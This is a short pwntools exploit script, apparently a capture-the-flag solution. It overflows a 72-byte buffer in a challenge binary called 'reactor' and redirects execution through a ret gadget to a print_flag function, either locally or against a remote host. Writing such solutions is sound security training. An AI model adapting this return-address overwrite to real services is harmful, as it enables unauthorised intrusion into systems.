from pwn import *
import sys

# Set up the binary
exe = './reactor'
elf = ELF(exe)

context.binary = elf

def start():
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    else:
        return process(exe)

p = start()

print_flag_addr = 0x401186
ret_gadget = 0x40101a


offset = 72

payload = b'A' * offset + p64(ret_gadget) + p64(print_flag_addr)

p.recvuntil(b'choice?\n')
p.sendline(b'4')

p.recvuntil(b'Enter override code:\n')
p.sendline(payload)


try:
    print(p.recvall(timeout=2).decode())
except Exception as e:
    print(e)

